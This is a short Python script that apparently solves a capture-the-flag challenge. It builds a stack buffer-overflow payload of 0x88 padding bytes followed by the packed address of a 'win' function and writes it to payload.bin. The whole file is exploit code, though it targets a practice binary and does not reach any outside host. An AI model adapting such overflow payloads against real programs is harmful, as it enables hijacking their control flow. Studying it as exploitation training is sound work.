#!/bin/python
from struct import pack

padding = b"A" * 0x88
win_addr = pack("<Q", 0x00400646)

payload = padding + win_addr

with open("payload.bin", "wb") as f:
    f.write(payload)
